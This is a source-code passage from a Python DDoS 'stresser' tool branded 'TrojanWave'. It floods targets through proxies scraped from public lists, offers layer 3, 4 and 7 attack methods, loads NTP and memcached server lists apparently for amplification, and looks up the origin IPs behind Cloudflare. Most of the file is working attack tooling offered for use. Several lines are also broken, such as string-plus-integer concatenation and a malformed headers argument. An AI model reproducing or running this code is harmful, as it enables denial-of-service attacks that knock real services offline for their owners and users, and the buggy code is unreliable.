                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(conn):
                try:
                    s.send(request) * conn
                    t += 1
                    sys.stdout.write("Connections = " + t + "\r")
                    sys.stdout.flush()
                except:
                    s.close()
                    proxy = Choice(proxies).strip().split(":")
        except:
            s.close()
            proxy = Choice(proxies).strip().split(":")


def checking(lines, socks_type, ms):
    global nums, proxies
    proxy = lines.strip().split(":")
    if len(proxy) != 2:
        proxies.remove(lines)
        return
    err = 0
    while True:
        if err == 3:
            proxies.remove(lines)
            break
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.settimeout(ms)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            s.close()
            break
        except:
            err += 1
    nums += 1


nums = 0


def check_socks(ms):
    global nums
    thread_list = []
    for lines in list(proxies):
        if choice == "5":
            th = threading.Thread(target=checking, args=(lines, 5, ms,))
            th.start()
        if choice == "4":
            th = threading.Thread(target=checking, args=(lines, 4, ms,))
            th.start()
        if choice == "1":
            th = threading.Thread(target=checking, args=(lines, 1, ms,))
            th.start()
        thread_list.append(th)
        sleep(0.01)
    for th in list(thread_list):
        th.join()
    ans = "y"
    if ans == "y" or ans == "":
        if choice == "4":
            with open(out_file, 'wb') as fp:
                for lines in list(proxies):
                    fp.write(bytes(lines, encoding='utf8'))
            fp.close()
        elif choice == "5":
            with open(out_file, 'wb') as fp:
                for lines in list(proxies):
                    fp.write(bytes(lines, encoding='utf8'))
            fp.close()
        elif choice == "1":
            with open(out_file, 'wb') as fp:
                for lines in list(proxies):
                    fp.write(bytes(lines, encoding='utf8'))
            fp.close()


def check_list(socks_file):
    temp = open(socks_file).readlines()
    temp_list = []
    for i in temp:
        if i not in temp_list:
            if ':' in i:
                temp_list.append(i)
    rfile = open(socks_file, "wb")
    for i in list(temp_list):
        rfile.write(bytes(i, encoding='utf-8'))
    rfile.close()


def downloadsocks(choice):
    global out_file
    if choice == "4":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
                             timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=socks4", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get(
                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=socks4&lastchecked=60",
                timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", timeout=5)
            f.write(r.content)
            f.close()
        except:
            f.close()
        try:

            req = requests.get("https://www.socks-proxy.net/", timeout=5, headers={"User-Agent", UserAgent}).text
            part = str(req)
            part = part.split("<tbody>")
            part = part[1].split("</tbody>")
            part = part[0].split("<tr><td>")
            proxies = ""
            for proxy in part:
                proxy = proxy.split("</td><td>")
                try:
                    proxies = proxies + proxy[0] + ":" + proxy[1] + "\n"
                except:
                    pass
                out_file = open(out_file, "a")
                out_file.write(proxies)
                out_file.close()
        except:
            pass
    if choice == "5":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all",
                             timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5", timeout=5)
            f.write(r.content)
            f.close()
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=socks5", timeout=5)
            f.write(r.content)
            f.close()
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get(
                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=socks5&lastchecked=60",
                timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get(
                "https://gist.githubusercontent.com/Azuures/1e0cb7a1097c720b4ed2aa63acd82179/raw/97d2d6a11873ffa8ca763763f7a5dd4035bcf95f/fwefnwex",
                timeout=5)
            f.write(r.content)
            f.close()
        except:
            f.close()
    if choice == "1":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all",
                             timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=5)
            f.write(r.content)
            f.close()
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=http", timeout=5)
            f.write(r.content)
            f.close()
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get(
                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=http&lastchecked=60",
                timeout=5)
            f.write(r.content)
            f.close()
        except:
            f.close()


def main():
    global proxies, multiple, choice, timer, out_file
    method = str(sys.argv[1]).lower()
    
    out_file = str("files/proxys/" + sys.argv[5])
    if not os.path.exists(out_file):
        makefile(out_file)

    if method == "check":
        proxydl(out_file, socks_type)
        exit()
    if method == "stop":
        url = str(sys.argv[2]).strip()
        UrlFixer(url)
        stop()
    elif (method == "help") or (method == "h"):
        usge()
    elif (method == "check"):
        pass
    elif str(method.upper()) not in str(methods):
        print("method not found")
        exit()
    timer = int(time.time()) + int(sys.argv[7])
    url = str(sys.argv[2]).strip()
    UrlFixer(url)
    choice = str(sys.argv[3]).strip()
    if choice != "4" and choice != "5" and choice != "1":
        print("Socks Type Not Found [4, 5, 1]")
        exit()
    if choice == "4":
        socks_type = 4
    elif choice == "1":
        socks_type = 1
    else:
        socks_type = 5
    threads = int(sys.argv[4])
    proxies = open(out_file).readlines()
    if method == "slow":
        conn = threads
        proxydl(out_file, socks_type)
        print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],len(proxies), str(nums)))

        for _ in range(conn):
            threading.Thread(target=slow, args=(conn, socks_type), daemon=True).start()
    else:
        multiple = str((sys.argv[6]))
        if multiple == "":
            multiple = int(100)
        else:
            multiple = int(multiple)
        event = threading.Event()
        start_attack(method, threads, event, socks_type)
        event.clear()
        event.set()
    while True:
        try:
            sleep(0.1)
        except KeyboardInterrupt:
            break


def proxydl(out_file, socks_type):
    global proxies, multiple, choice, data
    ms = 1
    if socks_type == 1:
        socktyper = "HTTP"
    if socks_type == 4:
        socktyper = "SOCKS4"
    if socks_type == 5:
        socktyper = "SOCKS5"

    print("downloading {}'s proxy plz wait".format(socktyper))
    downloadsocks(choice)
    proxies = open(str(out_file)).readlines()
    check_list(out_file)
    check_socks(ms)


bds = 0


# layer tool :||||||||||||
def toolgui():
    global bds
    tos = str(to).replace("'", "").replace("[", "").replace("]", "").replace(",", "\n")
    if bds == 0:
        print('''
Tools:
 ''' + tos+ '''
Other:
 Clear
 Exit
        ''')
    bds = 1
    tool = input(socket.gethostname() + "@"+name+":~# ").lower()
    if tool != "e" and (tool != "exit") and (tool != "q") and (tool != "quit") and (tool != "logout") and (
            tool != "close"):
        pass
    else:
        exit()
    if tool == "cfip":
        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
        cfip(domain)
        return tools()
    elif tool == "dstat":
        print(tool + ": command ready")
        return tools()
    elif tool == "dns":
        return tools()
    elif tool == "check":
        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
        check(domain)
        return tools()
    elif tool == "ping":
        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
        piger(domain)
        return tools()
    elif tool == "info":
        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
        piger(domain)
        return tools()
    elif (tool == "help") or (tool == "h") or (tool == "?"):
        tos = str(to).replace("'", "").replace("[", "").replace("]", "").replace(",", "\n")
        print('''
Tools:
 {tos}
Other:
 Clear
 Exit
        ''')
        return tools()
    elif (tool == "cls") or (tool == 'clear') or (tool == 'c'):
        print("\033[H\033[J")
        return tools()
    elif not tool:
        return tools()

    elif " " in tool:
        return tools()
    elif "        " in tool:
        return tools()
    elif "  " in tool:
        return tools()
    elif "\n" in tool:
        return tools()
    elif "\r" in tool:
        return tools()

    else:
        print(tool + ": command not found")
        return tools()


def tools():
    global domain, name
    name = "TrojanWave"
    try:
        tool = sys.argv[2].lower()
        if tool != "dstat":
            domain = sys.argv[3]
            if str('.') not in str(domain):
                print('address not found')
                toolgui()
        if tool == "cfip":
            cfip(domain)
        elif tool == "dns":
            print(tool + ": comming soon !")
        elif tool == "check":
            check(domain)
        elif tool == "ping":
            piger(domain)
        elif tool == "dstat":
            address = requests.get('http://ipinfo.io/ip', headers={"User-Agent": UserAgent, }).text
            print('now please attack to {address}')
            os.system('dstat')
        else:
            print('tool not found')
            toolgui()
    except IndexError:
        toolgui()


def cfip(domain):
    if str("http") in str(domain):
        domain = domain.replace('https://', '').replace('http:', '').replace('/')
    URL = "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi"
    r = requests.post(URL, data={"cfS": {domain}}, headers={"User-Agent": UserAgent, }, timeout=1)
    print(r.text)


def check(domain):
    if str("http") not in str(domain):
        domain = "http://" + domain
    print('please wait ...')
    r = requests.get(domain, timeout=20)
    if str("50") in str(r.status_code):
        die = "OFFLINE"
    else:
        die = "ONLINE"
    print('\nstatus_code: '+r.status_code)
    print('status: '+die+'\n')


def piger(siye):
    if str("https") in str(siye):
        domain = str(siye).replace('https', '').replace('/', '').replace(':', '')
    elif str("http") in str(siye):
        domain = str(siye).replace('http', '').replace('/', '').replace(':', '')
    else:
        domain = str(siye)
    print('please wait ...')
    r = pig(domain, count=5, interval=0.2)
    if r.is_alive:
        die = "ONLINE"
    else:
        die = "OFFLINE"
    print('\nAddress: '+r.address)
    print('Ping: '+r.avg_rtt)
    print('Aceepted Packets: '+r.packets_received+'/'+r.packets_sent)
    print('status: '+die+'\n')


def usgeaseets():
    global metho, url, SOCKST, thr, proxylist, muli, tim, l7s, l4s, tos, ots, l3s
    socks = ["1", "4", "5"]
    sockst = ["socks4.txt", "socks5.txt", "http.txt"]
    try:
        if sys.argv[3] not in socks:
            SOCKST = Choice(socks)
        elif sys.argv[3]:
            SOCKST = sys.argv[3]

        else:
            SOCKST = Choice(socks)
    except:
        SOCKST = Choice(socks)

    if (str(SOCKST) == str('1')):
        proxylist = "http.txt"
    else:
        proxylist = "socks{0}.txt".format(SOCKST)

    try:
        met = str(sys.argv[1]).upper()
        if met not in list(methods):
            metho = Choice(methods).lower()
        elif sys.argv[1]:
            metho = sys.argv[1]
        else:
            metho = Choice(methods).lower()
    except:
        metho = Choice(methods).lower()
    try:
        methos = metho.upper()
        if (methos in l4) or (methos in l3):
            url = sys.argv[2]
        elif str("http") not in sys.argv[2]:
            url = "https://example.ir"
        elif sys.argv[2]:
            url = sys.argv[2]
        else:
            url = "https://example.ir"
    except:
        url = "https://example.ir"
    try:
        if sys.argv[4]:
            thr = sys.argv[4]
        else:
            thr = Intn(100, 1000)
    except:
        thr = Intn(10, 1000)
    try:
        if (sys.argv[5] not in sockst):
            exit()
    except IndexError:
        pass
    except:
        print('socks type not found')
        exit()

    try:
        if sys.argv[6]:
            muli = sys.argv[6]
        else:
            muli = Intn(5, 100)
    except:
        muli = Intn(5, 100)
    try:
        if sys.argv[7]:
            tim = sys.argv[7]
        else:
            tim = Intn(10, 10000)
    except:
        tim = Intn(10, 10000)

    l4s = str(l4).replace("'", "").replace("[", "").replace("]", "")
    l3s = str(l3).replace("'", "").replace("[", "").replace("]", "")
    l7s = str(l7).replace("'", "").replace("[", "").replace("]", "")
    tos = str(to).replace("'", "").replace("[", "").replace("]", "")
    ots = str(ot).replace("'", "").replace("[", "").replace("]", "")


def usge():
    usgeaseets()
    print('* Coded By MH_ProDev For Better Stresser')
    print('python3 {} <method> <url> <socks_type5.4.1> <threads> <proxylist> <multiple> <timer>\n'.format(sys.argv[0]))
    print(' > Methods:')
    print(' - L3')
    print(' | {} | {} Methods'.format(l3s, len(l3)))
    print(' - L4')
    print(' | {} | {} Methods'.format(l4s, len(l4)))
    print(' - L7')
    print(' | {} | {} Methods'.format(l7s, len(l7)))
    print(' - TOOLS')
    print(' | {} | {} Methods'.format(tos, len(to)))
    print(' - Other')
    print(' | {} | {} Methods'.format(ots, len(ot)))
    print(' - All {} Method \n'.format(len(methodsl)))
    print(
        'expmple:\n python3 {} {} {} {} {} {} {} {}'.format(sys.argv[0], metho, url, SOCKST, thr, proxylist, muli, tim))


def makefile(text):
    if text == "files/":
        os.mkdir(text)
    elif text == "files/proxys/":
        os.mkdir(text)
    else:
        open(text, 'w').close()
    print('File: ', text)

if __name__ == '__main__':
    import os, requests, socket, socks, time, random, threading, sys, ssl, datetime, cfscrape, re
    from time import sleep
    from icmplib import ping as pig
    from scapy.layers.inet import TCP
    from scapy.all import *
    from socket import gaierror
    acceptall = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept-Encoding: gzip, deflate",
        "Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Charset: iso-8859-1Accept-Encoding: gzip",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1Accept-Charset: utf-8, iso-8859-1;q=0.5",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
    ]

    data = ""
    strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890"
    Intn = random.randint
    Choice = random.choice
    if not os.path.exists('files/'):
        makefile('files/')
    if not os.path.exists('files/proxys/'):
        makefile('files/proxys/')
    if not os.path.exists('files/useragent.txt'):
        makefile('files/proxys/useragent.txt')
    if not os.path.exists('files/ntp_servers.txt'):
        makefile('files/ntp_servers.txt')
    if not os.path.exists('files/memcached_servers.txt'):
        makefile('files/memcached_servers.txt')
    if not os.path.exists('files/referers.txt'):
        makefile('files/referers.txt')
    try:
        with open("files/useragent.txt", "r") as f:
            readuser = str(f.readlines()).replace('\n', '').replace('\r', '')
        with open("files/referers.txt", "r") as f:
            readref = str(f.readlines()).replace('\n', '').replace('\r', '')
        with open("files/memcached_servers.txt", "r") as f:
            memsv = str(f.readlines()).replace('\n', '').replace('\r', '')
        with open("files/ntp_servers.txt", "r") as f:
            ntpsv = str(f.readlines()).replace('\n', '').replace('\r', '')
        UserAgent = Choice(readuser)
        referers = Choice(readref)
        memcached_servers = Choice(memsv)
        try:
            bdr = str(sys.argv[1]).lower()
            if bdr == "tools":
                tools()
            elif bdr == "stop":
                stop()
            elif bdr == "help":
                usge()
            elif len(sys.argv) <= int(7):
                usge()
            else:
                main()
        except IndexError:
            usge()
    except KeyboardInterrupt:
        sys.exit()
    except IndexError:
        usge()

